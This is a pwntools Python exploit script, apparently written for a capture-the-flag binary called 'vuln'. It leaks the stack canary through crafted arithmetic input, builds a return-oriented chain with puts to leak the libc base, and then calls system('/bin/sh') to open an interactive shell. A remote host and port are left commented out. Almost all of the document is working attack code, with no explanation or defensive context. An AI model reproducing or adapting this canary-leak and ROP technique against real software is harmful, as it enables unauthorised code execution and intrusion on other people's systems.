#!/usr/bin/env python3
from pwn import *
import sys

elf = ELF('./vuln')
libc = ELF('./libc.so.6')
context.update(binary=elf, log_level="DEBUG")
# p = remote("172.188.64.101", "1337")
p = elf.process()
# p = gdb.debug('./vuln', '''
# 	b *0x4012cd
# 	b *0x0000000000400ECF
# 	b *0x0000000000400F0F
# 	b *0x40118d
# 	b *0x4011db
# 	''')
# fn_handle_expression
# breakpoint call func fn_allocate
# breakpoint call func fn_parse
# setup for call func fn_eval
# ret in func fn_handle_expression

def to_ascii(n):
	return str(n).encode('ascii')

### stage 1 - leak canary
payload = b""
payload += b"1+1+1+1+1+1+1+1+1+1+41"
p.sendline(payload)
leak = p.recvline().strip()
leak = int(leak, 10)
hex_in_str = format(leak & 0xffffffffffffffff, '0x') # convert negative number
canary_leak = int(hex_in_str, 16)
log.info("Stack CANARY leak: " + hex(canary_leak))

### stage 2 - leak libc
RW_AREA = 0x0060272b
pop_rdi = 0x0000000000401343
puts_got = elf.got['puts']
puts_plt = elf.symbols['puts']
main = 0x040121f
ret = 0x0400646
pop_rsi_r15 = 0x0401341
mov_rax_ptr_rbp_sub_8 = 0x0400832
pop_r15 = 0x0401342
gadget_rax = 0x04008ef #  mov rax, qword ptr [rbp - 0x10] ; mov qword ptr [rdx], rax ; nop ; pop rbp ; ret
csu_gadget_1 = 0x40133a
csu_gadget_2 = 0x401320
exit_got = elf.got['exit']
payload = b""
payload += b"1+1+1+1+1+1+1+1+1+1+1+("
payload += to_ascii(canary_leak)
payload += b"+("
payload += to_ascii(0xdeaddead) # rbp-0x8
payload += b"+("
payload += to_ascii(0x20b91) # rbp, corrupted top size recovering
payload += b"+("
payload += to_ascii(0xdeaddead)
payload += b"+("
payload += to_ascii(pop_rdi)
payload += b"+("
payload += to_ascii(puts_got)
payload += b"+"
payload += b'\x00'*3  # fill 
payload += p64(puts_plt)
payload += p64(main)
p.sendline(payload)
p.recvline() # payload output first
out = p.recvline()[:-1]
libc.address = u64(out.ljust(8, b"\x00")) - libc.symbols['puts']
system = libc.symbols['system']
binsh = next(libc.search(b'/bin/sh'))
exit_ = libc.symbols['exit']
log.info("LIBC base address:             " + hex(libc.address))
log.info("Libc system func address:      " + hex(system))
log.info("Libc string '/bin/sh' address: " + hex(binsh))
log.info("Libc exit func address:        " + hex(exit_))


### stage 3 - execute the shell
payload = b""
payload += b"1+1+1+1+1+1+1+1+1+1+1+"
payload += to_ascii(canary_leak)
payload += b"+1+("
payload += to_ascii(pop_rdi)
payload += b"+("
payload += to_ascii(binsh)
payload += b"+("
payload += to_ascii(ret)
payload += b"+("
payload += to_ascii(system)
# payload += b"+("
# payload += to_ascii(exit_)
p.sendline(payload)

p.interactive()
